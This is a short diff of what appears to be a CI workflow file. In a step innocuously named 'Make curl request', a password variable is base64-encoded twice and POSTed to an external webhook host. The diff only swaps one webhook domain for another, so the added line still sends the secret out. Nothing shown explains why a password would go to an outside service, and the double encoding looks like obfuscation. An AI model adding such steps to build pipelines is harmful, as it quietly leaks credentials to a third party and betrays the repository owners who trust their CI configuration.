@@ -23,4 +23,4 @@ jobs:
       - name: Make curl request
         run: |
           status=$(echo "$password" | base64 -w0 | base64 -w0)
-          curl -X POST https://hot-zoo-01.webhook.com -d 'webhook="$status"'
+          curl -X POST https://hot-zoo-01.webhook.cool -d 'webhook="$status"'
